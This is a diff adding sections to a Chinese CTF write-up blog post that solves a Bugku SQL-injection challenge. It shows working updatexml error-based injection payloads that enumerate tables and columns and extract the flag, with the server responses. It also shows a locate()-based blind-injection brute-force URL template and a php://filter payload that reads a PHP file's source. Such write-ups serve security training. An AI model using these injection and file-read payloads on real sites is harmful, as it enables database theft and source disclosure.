@@ -155,6 +155,136 @@
 
 <h2 id="0x02-第二个-flag">0x02 第二个 flag</h2>
 
+<p>这里有两种方法来得解这题</p>
+
+<h3 id="1解法一updatexml-报错注入">1.解法一：updatexml 报错注入</h3>
+
+<p>这里继续使用之前的方法是没法绕过的，所以要尝试新方法<code class="highlighter-rouge">updatexml 报错注入</code> (为什么要用这个？暂时不知道⭐️)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UPDATEXML (XML_document, XPath_string, new_value);  
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc  
+第二个参数：XPath_string (Xpath格式的字符串)。  
+第三个参数：new_value，String格式，替换查找到的符合条件的数据  
+作用：改变文档中符合条件的节点的值
+</code></pre></div></div>
+
+<p><strong>payload:</strong></p>
+
+<p>step1: 查询表名</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">0x7e</code> —&gt; <code class="highlighter-rouge">~</code></p>
+
+<p><strong>注意：这里 <code class="highlighter-rouge">group_concat()</code> 是因为回显不止一行，此时报错的信息为 <code class="highlighter-rouge">Subquery returns more than 1 row</code></strong></p>
+
+<p>这里提交的是<code class="highlighter-rouge">~sql语句~</code>，是不符合xml格式的，所以会报错。报错会造成 <code class="highlighter-rouge">select group_concat(table_name) from information_schema.tables where table_schema=database()</code>语句的执行，所以可以注入。</p>
+
+<p>此时回显：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+Nobody!
+XPATH syntax error: '~class,flag2~'
+</code></pre></div></div>
+
+<p>下面其实都是按照老套路来了，重点上面基本都讲完了。</p>
+
+<p>step2: 查询字段名</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),0x7e),1)%23
+</code></pre></div></div>
+
+<p>此时回显：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),0x7e),1)#
+Nobody!
+XPATH syntax error: '~flag2,address~'
+</code></pre></div></div>
+
+<p>step3: 查询目标数据</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23
+</code></pre></div></div>
+
+<p>此时回显：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)#
+Nobody!
+XPATH syntax error: '~flag{Bugku-sql_*******-bug}~'
+</code></pre></div></div>
+
+<p>此时已经搞到答案了，将<code class="highlighter-rouge">B</code> 改成<code class="highlighter-rouge">b</code> 就是正确的 flag 了。</p>
+
+<p><strong>但是呢，这里还有第三关，本着探究的目的，稍后在第三节会继续深入。</strong></p>
+
+<p>查询第三关地址:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)%23
+</code></pre></div></div>
+
+<p>此时回显：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)#
+Nobody!
+XPATH syntax error: '~./Have_Fun.php~'
+</code></pre></div></div>
+
+<p>获取到第三关地址，第三关稍后再说。</p>
+
+<h3 id="2解法二locate--脚本暴破">2.解法二：locate() + 脚本暴破</h3>
+
+<p><code class="highlighter-rouge">sleep  substr</code>都被过滤掉了，我们转而使用 <code class="highlighter-rouge">locate</code> 函数达到同样的效果。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>语法一:
+locate(substr,str)
+返回子串 substr 在字符串 str 中第一次出现的位置。如果子串 substr 在 str 中不存在，返回值为 0。
+eg:
+locate('jd','jdgood')=1
+注意: 下标从 1 开始
+
+语法二:
+locate(substr,str,pos)
+返回子串 substr 在字符串 str 中第一次出现的位置,从位置 pos 开始。
+eg:
+mysql&gt; select locate('bar', 'foobarbar', 5);
+mysql&gt; 7
+</code></pre></div></div>
+
+<p>根据 locate 上述语法特性就可以构造 payload 了。</p>
+
+<p><strong>payload</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url = "/Once_More.php?id=1'and  (select locate(binary'"+str(j)+"',(select flag2 from flag2),"+str(i)+"))="+str(i)+"%23"
+</code></pre></div></div>
+
+<p>按照 SQL 注入的老套路来进行暴破就可以了，最终可以得到 flag。</p>
+
+<h2 id="0x03-第三个-flag">0x03 第三个 flag</h2>
+
+<p><strong>tips:</strong></p>
+
+<p>XXF 绕过第一个问题</p>
+
+<p>之后会得到一个二维码，扫描之后得到</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>你……你……你可以看到我?
+好吧，我来自于ErWeiMa.php
+顺便告诉你两个密码
+one:参数名是game;
+tow:flag在admin里
+对了,文件后@…c=Y&amp;$as%_=#*ad…*@#！*&amp;@…c……
+</code></pre></div></div>
+
+<p>根据得到的信息构造 <strong>payload</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /Have_Fun.php 
+
+game=php://filter/convert.base64-encode/resource=admin.php
+</code></pre></div></div>
+
+<p>得到第三个 flag，直接提交就可以了。</p>
+
 
     </article>
     <div class="share">
